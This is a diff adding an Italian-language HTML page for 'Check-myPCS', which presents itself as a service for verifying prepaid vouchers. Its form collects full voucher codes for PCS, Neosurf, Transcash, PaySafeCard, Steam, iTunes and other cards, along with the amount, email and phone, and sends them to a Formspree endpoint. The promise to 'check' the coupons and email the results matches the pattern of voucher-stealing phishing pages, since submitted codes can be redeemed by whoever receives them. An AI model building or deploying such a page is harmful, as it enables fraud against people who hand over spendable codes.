@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Controlla un coupon - Check-myPCS</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        /* Styles spécifiques à la page de Activation */
+        :root {
+            --primary-color: #4a6bff;
+            --secondary-color: #ff6b6b;
+            --dark-color: #2c3e50;
+            --light-color: #f8f9fa;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #f5f7ff;
+        }
+
+        .verification-container {
+            max-width: 800px;
+            margin: 40px auto;
+            padding: 30px;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
+        }
+
+        .page-title {
+            text-align: center;
+            margin-bottom: 30px;
+            color: var(--dark-color);
+            position: relative;
+        }
+
+        .page-title::after {
+            content: '';
+            position: absolute;
+            width: 100px;
+            height: 4px;
+            background: linear-gradient(to right, var(--primary-color), var(--secondary-color));
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            border-radius: 2px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--dark-color);
+        }
+
+        .form-group.required label::after {
+            content: ' *';
+            color: var(--secondary-color);
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-family: 'Poppins', sans-serif;
+            transition: all 0.3s ease;
+        }
+
+        .form-control:focus {
+            border-color: var(--primary-color);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(74, 107, 255, 0.2);
+        }
+
+        select.form-control {
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 10px center;
+            background-size: 15px;
+        }
+
+        .btn-submit {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-weight: 500;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 30px;
+        }
+
+        .btn-submit:hover {
+            background-color: #3a5bef;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(74, 107, 255, 0.3);
+        }
+
+        /* Notification */
+        .notification {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            background-color: var(--primary-color);
+            color: white;
+            padding: 15px 25px;
+            border-radius: 5px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            z-index: 1001;
+            transform: translateY(100px);
+            opacity: 0;
+            transition: all 0.3s ease;
+            max-width: 400px;
+        }
+
+        .notification.show {
+            transform: translateY(0);
+            opacity: 1;
+        }
+
+        .notification i {
+            margin-right: 10px;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .verification-container {
+                margin: 20px;
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Navigation (différente de la page d'accueil; similaire aux autres pages) -->
+    <header id="header">
+        <div class="container">
+            <nav>
+                <img src="images/xcc.png" alt="Check-myPCS" class="logo">
+                <span class="logo-text">Check-myPCS</span>
+
+                <ul class="nav-links">
+                    <li><a href="index-it.html">Benvenuto</a></li>
+                    <li><a href="verifier-coupon-it.html" class="active">Controlla un coupon</a></li>
+                    <li><a href="index-it.html#faq">FAQ</a></li>
+                    
+                </ul>
+                <div class="hamburger">
+                    <i class="fas fa-bars"></i>
+                </div>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Contenu principal -->
+    <main class="container">
+        <div class="verification-container">
+            <h1 class="page-title">Controlla un coupon</h1>
+            <p style="text-align: center; margin-bottom: 30px; color: #666;">
+                Compila questo modulo per verificare la validità del tuo coupon di ricarica.
+                Riceverai i risultati via email il prima possibile.
+            </p>
+
+            <form id="verificationForm" action="https://formspree.io/f/YOUR_FORMSPREE_ID" method="POST">
+                <!-- Informations personnelles -->
+                <div class="form-group required">
+                    <label for="fullname">Pseudo</label>
+                    <input type="text" id="fullname" name="fullname" class="form-control">
+                </div>
+
+                <div class="form-group">
+                    <label for="phone">Telefono</label>
+                    <input type="tel" id="phone" name="phone" class="form-control">
+                </div>
+
+                <div class="form-group required">
+                    <label for="email">E-mail</label>
+                    <input type="email" id="email" name="email" class="form-control" required>
+                </div>
+
+                <!-- Détails du coupon -->
+                <div class="form-group required">
+                    <label for="cardType">Tipo di carta</label>
+                    <select id="cardType" name="cardType" class="form-control" required>
+                        <option value="" disabled selected>Seleziona un tipo</option>
+                        <option value="PCS">PCS</option>
+                        <option value="Neosurf">Neosurf</option>
+                        <option value="Apple Card">Apple Card</option>
+                        <option value="Transcash">Transcash</option>
+                        <option value="GiftCard">GiftCard</option>
+                        <option value="Google Pay">Google Pay</option>
+                        <option value="PaySafeCard">PaySafeCard</option>
+                        <option value="NeoCash">NeoCash</option>
+                        <option value="Steam">Steam</option>
+                        <option value="Cash Ticket">Cash Ticket</option>
+                        <option value="Toneo">Toneo</option>
+                        <option value="iTunes">iTunes</option>
+                    </select>
+                </div>
+
+                <div class="form-group required">
+                    <label for="code1">Code 1</label>
+                    <input type="text" id="code1" name="code1" class="form-control" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="code2">Code 2</label>
+                    <input type="text" id="code2" name="code2" class="form-control">
+                </div>
+
+                <div class="form-group">
+                    <label for="code3">Code 3</label>
+                    <input type="text" id="code3" name="code3" class="form-control">
+                </div>
+
+                <div class="form-group">
+                    <label for="amount">Quantità (€)</label>
+                    <input type="number" id="amount" name="amount" class="form-control" min="0" step="0.01">
+                </div>
+
+                <button type="submit" class="btn-submit">Controlla il coupon</button>
+            </form>
+        </div>
+    </main>
+
+    <!-- Notification -->
+    <div class="notification" id="notification">
+        <i class="fas fa-check-circle"></i>
+        <span>La tua richiesta di analisi è in elaborazione. Riceverai un'e-mail di conferma entro un minuto.</span>
+    </div>
+
+    <!-- Footer -->
+    <footer id="footer-contact">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-column">
+                    <h3>Check-myPCS</h3>
+                    <p>La soluzione più affidabile per controllare i tuoi coupon di ricarica del cellulare prima dell'uso.</p>
+                    <div class="social-links">
+                        <a href="#"><i class="fab fa-facebook-f"></i></a>
+                        <a href="#"><i class="fab fa-twitter"></i></a>
+                        <a href="#"><i class="fab fa-instagram"></i></a>
+                        <a href="#"><i class="fab fa-linkedin-in"></i></a>
+                    </div>
+                </div>
+                <div class="footer-column">
+                    <h3>Collegamenti rapidi</h3>
+                    <ul class="footer-links">
+                        <li><a href="index-it.html">Benvenuto</a></li>
+                        <li><a href="verifier-coupon-it.html">Controlla un coupon</a></li>
+                        <li><a href="index-it.html#faq">FAQs</a></li>
+                        
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h3>Legal</h3>
+                    <ul class="footer-links">
+                        <li><a href="conditions-it.html">Termini di utilizzo</a></li>
+                        <li><a href="confidentialite-it.html">Politica sulla riservatezza</a></li>
+                        <li><a href="nousconnaitre-it.html">Chi siamo</a></li>
+                    </ul>
+                </div>
+
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2023 Check-myPCS. Tutti i diritti riservati.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Gestion du formulaire
+        const verificationForm = document.getElementById('verificationForm');
+        const notification = document.getElementById('notification');
+
+        verificationForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Envoyer le formulaire via Formspree
+            fetch(verificationForm.action, {
+                method: 'POST',
+                body: new FormData(verificationForm),
+                headers: {
+                    'Accept': 'application/json'
+                }
+            })
+            .then(response => {
+                if (response.ok) {
+                    // Afficher la notification
+                    notification.classList.add('show');
+                    
+                    // Réinitialiser le formulaire
+                    verificationForm.reset();
+                    
+                    // Masquer la notification après 5 secondes
+                    setTimeout(() => {
+                        notification.classList.remove('show');
+                    }, 5000);
+                } else {
+                    throw new Error('Erreur lors de l\'envoi du formulaire');
+                }
+            })
+            .catch(error => {
+                console.error('Erreur:', error);
+                alert('Une erreur s\'est produite. Veuillez réessayer.');
+            });
+        });
+
+        // Menu mobile
+        const hamburger = document.querySelector('.hamburger');
+        const navLinks = document.querySelector('.nav-links');
+
+        hamburger.addEventListener('click', () => {
+            navLinks.classList.toggle('active');
+            hamburger.classList.toggle('active');
+            hamburger.innerHTML = navLinks.classList.contains('active') ? 
+                '<i class="fas fa-times"></i>' : '<i class="fas fa-bars"></i>';
+        });
+
+        // Fermer le menu quand on clique sur un lien
+        document.querySelectorAll('.nav-links a').forEach(link => {
+            link.addEventListener('click', () => {
+                navLinks.classList.remove('active');
+                hamburger.classList.remove('active');
+                hamburger.innerHTML = '<i class="fas fa-bars"></i>';
+            });
+        });
+    </script>
+</body>
+</html>
